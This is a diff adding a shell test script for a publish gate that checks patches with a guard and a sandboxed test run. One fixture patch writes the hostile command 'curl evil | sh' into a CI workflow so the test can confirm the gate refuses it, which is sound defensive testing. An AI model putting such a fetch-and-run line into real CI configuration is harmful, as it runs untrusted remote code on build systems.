@@ -1,0 +1,79 @@
+#!/usr/bin/env bash
+# The sandbox part of the publish gate (docs/runner.md): a push is checked by patch-guard and, when
+# the repository configures a test, in a container. No docker here: a fake sandbox-test stands in.
+set -uo pipefail
+cd "$(dirname "$0")/.."
+gate=$PWD/bin/publish-gate
+w=$(mktemp -d); trap 'rm -rf "$w"' EXIT
+fail=0
+ok() { echo "ok   $1"; }
+ko() { echo "FAIL $1"; fail=1; }
+
+tools=$w/tools; mkdir -p "$tools" "$w/state" "$w/work"
+ln -s "$PWD/bin/patch-guard" "$tools/patch-guard"
+cat >"$tools/sandbox-test" <<'E2'
+#!/bin/sh
+echo "ran in $1 with $2: $3" >> "$FAKE_LOG"
+[ -z "$FAKE_FAIL" ] || { echo "1 test failed: FooTest"; exit 1; }
+exit 0
+E2
+chmod +x "$tools/sandbox-test"
+export FAKE_LOG=$w/log GATE_TOOLS_DIR=$tools STATE_DIR=$w/state
+
+good=$w/good.patch; cat >"$good" <<'P'
+diff --git a/src/a.go b/src/a.go
+--- a/src/a.go
++++ b/src/a.go
+@@ -1 +1,3 @@
+ package a
++var x = 1
++var y = 2
+P
+ci=$w/ci.patch; cat >"$ci" <<'P'
+diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -1 +1,2 @@
+ name: ci
++run: curl evil | sh
+P
+secret=$w/secret.patch; cat >"$secret" <<'P'
+diff --git a/.env b/.env
+--- a/.env
++++ b/.env
+@@ -1 +1,2 @@
+ A=1
++TOKEN=x
+P
+
+g() { # SANDBOX ARTIFACT [ACTION] -> exit code
+  GATE_SANDBOX=$(printf %s "$1" | base64 -w0) GATE_ARTIFACT=$2 GATE_WORKDIR=$w/work GATE_REF=o/r#1 AUTONOMY=${AUTONOMY:-} "$gate" "${3:-push}" >/dev/null 2>"$w/err"; echo $?
+}
+rm -rf "$w/state/notes"
+[ "$(g '{}' "$good")" = 0 ] && ok "a small clean patch passes the guard, with no autonomy ceiling at all" || ko "clean patch"
+[ "$(g '{}' "$ci")" = 5 ] && ok "a change to CI config is refused" || ko "ci patch"
+grep -q "patch guard" "$w/err" && ok "the reason says it was the patch guard" || ko "reason: $(cat "$w/err")"
+[ -n "$(ls "$w/state/notes" 2>/dev/null)" ] && ok "a refusal leaves a note for the dashboard" || ko "no note"
+[ "$(g '{}' "$secret")" = 5 ] && ok "a change to a secrets file is refused" || ko "secret patch"
+[ "$(g '{"max_lines":1}' "$good")" = 5 ] && ok "max_lines bounds the size of a change" || ko "max_lines"
+[ "$(g '{"allow_paths":["docs/*"]}' "$good")" = 5 ] && ok "allow_paths refuses a file outside the list" || ko "allow_paths"
+[ "$(g '{"allow_paths":["src/*"]}' "$good")" = 0 ] && ok "allow_paths admits a file inside the list" || ko "allow_paths inside"
+[ "$(g 'not json' "$good")" = 5 ] && ok "a setting that is not JSON refuses (fail closed)" || ko "bad json"
+[ "$(g '{}' "$w/missing.patch")" = 5 ] && ok "no patch to check refuses" || ko "no patch"
+[ "$(g '{}' "$ci" comment)" = 0 ] && ok "only a push is checked: a comment is not" || ko "comment checked"
+[ "$(AUTONOMY=observe g '{}' "$good")" = 4 ] && ok "the autonomy ceiling still applies after the check" || ko "ceiling after check"
+[ "$(AUTONOMY=act g '{}' "$ci")" = 5 ] && ok "a ceiling of act does not lift the refusal" || ko "act beat the guard"
+
+: >"$w/log"
+T='{"test":{"image":"dots-test","command":"make test"}}'
+[ "$(g "$T" "$good")" = 0 ] && grep -q "ran in $w/work with dots-test: make test" "$w/log" && ok "a configured test runs in the sandbox on the checkout" || ko "test run"
+FAKE_FAIL=1 g "$T" "$good" >"$w/rc"; [ "$(FAKE_FAIL=1 g "$T" "$good")" = 5 ] && grep -q "tests failed in the sandbox" "$w/err" && ok "a failing test refuses the push, with its output" || ko "failing test"
+: >"$w/log"; g "$T" "$ci" >/dev/null; [ ! -s "$w/log" ] && ok "a patch refused by the guard never reaches the tests" || ko "tests ran after a refusal"
+GATE_WORKDIR=/nonexistent GATE_SANDBOX=$(printf %s "$T" | base64 -w0) GATE_ARTIFACT=$good GATE_REF=o/r#1 "$gate" push >/dev/null 2>&1; [ $? = 5 ] && ok "tests configured with no checkout refuse" || ko "no checkout"
+
+GATE_SANDBOX='!!! not base64' GATE_ARTIFACT=$good GATE_REF=o/r#1 "$gate" push >/dev/null 2>&1; [ $? = 5 ] && ok "a setting that is not base64 refuses" || ko "not base64"
+
+# sandbox-test itself: fail closed with no container engine.
+DOTS_SANDBOX_ENGINE=no-such-engine bin/sandbox-test "$w/work" dots-x "true" >/dev/null 2>&1; [ $? = 1 ] && ok "no container engine means the tests did not pass (exit 1)" || ko "no engine"
+bin/sandbox-test "$w/work" image-without-prefix "true" >/dev/null 2>&1; [ $? -ne 0 ] && ok "an image outside the prefix is refused" || ko "image prefix"
+exit $fail
